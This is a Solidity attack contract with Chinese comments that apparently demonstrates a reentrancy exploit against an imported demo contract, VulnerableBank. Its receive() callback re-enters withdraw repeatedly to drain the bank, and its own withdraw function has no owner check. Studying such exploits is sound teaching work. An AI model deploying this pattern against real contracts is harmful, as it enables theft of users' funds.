// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

/**
 * @title ReentrancyAttacker
 * @dev 重入攻击合约
 * 这个合约演示了如何利用VulnerableBank中的重入漏洞
 */
contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public attackCount = 0;
    uint256 public maxAttacks = 5;

    // 事件
    event AttackStarted(uint256 initialBalance);
    event AttackStep(uint256 step, uint256 contractBalance);
    event AttackCompleted(uint256 stolenAmount);

    constructor(address bankAddress) {
        bank = VulnerableBank(bankAddress);
    }

    /**
     * @dev 启动攻击
     */
    function attack(uint256 initialDepositAmount) public {
        require(initialDepositAmount > 0, "Initial deposit must be greater than 0");
        require(address(this).balance >= initialDepositAmount, "Insufficient balance");

        emit AttackStarted(initialDepositAmount);

        // 步骤1：向银行存入初始金额
        bank.deposit{value: initialDepositAmount}();

        // 步骤2：开始提款，触发重入漏洞
        attackCount = 0;
        bank.withdraw(initialDepositAmount);
    }

    /**
     * @dev 回调函数 - 在receive中被调用
     * 这是重入攻击的关键
     * 当银行发送ETH时，这个函数被调用
     * 我们在这里再次调用withdraw，形成重入
     */
    receive() external payable {
        attackCount++;
        emit AttackStep(attackCount, address(bank).balance);

        // 如果还有攻击次数，继续重入
        if (attackCount < maxAttacks && address(bank).balance > 0) {
            uint256 bankBalance = bank.getUserBalance(address(this));
            if (bankBalance > 0) {
                bank.withdraw(bankBalance);
            }
        }
    }

    /**
     * @dev 获取攻击者的余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @dev 获取银行中的余额
     */
    function getBankBalance() public view returns (uint256) {
        return bank.getUserBalance(address(this));
    }

    /**
     * @dev 提取所有资金
     */
    function withdraw() public {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance to withdraw");
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Withdrawal failed");
    }
}
